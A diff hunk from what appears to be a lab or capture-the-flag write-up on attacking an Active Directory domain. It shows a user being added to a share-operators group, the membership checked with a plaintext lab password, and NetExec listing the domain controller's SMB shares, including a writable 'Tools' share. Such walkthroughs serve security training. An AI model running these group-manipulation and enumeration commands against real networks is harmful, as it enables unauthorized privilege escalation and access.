@@ -476,7 +476,25 @@ net rpc group addmem "shares_operators" "mike.silver" -U "dismay.hsm"/"mike.silv
 This should have added the member to the group
 
 ```python
-
+net rpc group members "shares_operators" -U "dismay.hsm"/"mike.silver"%'Password123!' -S "10.0.16.4" 
+DISMAY\mike.silver
 ```
+I am now in this group
+
+```python
+nxc smb dc1.dismay.hsm -u mike.silver -p 'Password123!' --shares
+SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.16.4       445    DC1              [+] dismay.hsm\mike.silver:Password123! 
+SMB         10.0.16.4       445    DC1              [*] Enumerated shares
+SMB         10.0.16.4       445    DC1              Share           Permissions     Remark
+SMB         10.0.16.4       445    DC1              -----           -----------     ------
+SMB         10.0.16.4       445    DC1              ADMIN$                          Remote Admin
+SMB         10.0.16.4       445    DC1              C$                              Default share
+SMB         10.0.16.4       445    DC1              IPC$            READ            Remote IPC
+SMB         10.0.16.4       445    DC1              NETLOGON        READ            Logon server share 
+SMB         10.0.16.4       445    DC1              SYSVOL          READ            Logon server share 
+SMB         10.0.16.4       445    DC1              Tools           READ,WRITE
+```
+
 
 
